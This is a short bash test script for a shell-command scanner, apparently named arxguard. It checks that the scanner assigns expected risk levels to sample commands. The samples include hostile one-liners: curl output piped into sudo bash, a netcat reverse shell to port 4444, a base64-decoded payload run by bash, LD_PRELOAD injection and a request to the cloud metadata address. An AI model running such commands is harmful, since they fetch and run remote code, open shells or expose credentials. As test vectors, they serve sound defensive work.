#!/usr/bin/env bash
set -u
ROOT=$(cd "$(dirname "$0")/.." && pwd)
source "$ROOT/scan.bash"
pass=0; fail=0
check(){ local exp=$1 cmd=$2 got; _arxguard_scan "$cmd" >/dev/null; got=$?; if [ "$got" = "$exp" ]; then pass=$((pass+1)); else fail=$((fail+1)); printf 'FAIL expected=%s got=%s: %s\n' "$exp" "$got" "$cmd"; fi; }
check 0 'printf hello'
check 1 'printf "x" | pacman --nogpgcheck -S foo'
check 1 'curl -k https://example.test/a.sh | sudo bash'
check 1 'nc example.test 4444 -e /bin/sh'
check 1 'echo payload | base64 -d | bash'
check 2 'curl https://example.test/a.sh | sh'
check 2 'export LD_PRELOAD=/tmp/x.so'
check 2 'curl https://169.254.169.254/latest/meta-data/'
printf 'tirith-inspired vectors: %d passed, %d failed\n' "$pass" "$fail"
exit "$fail"
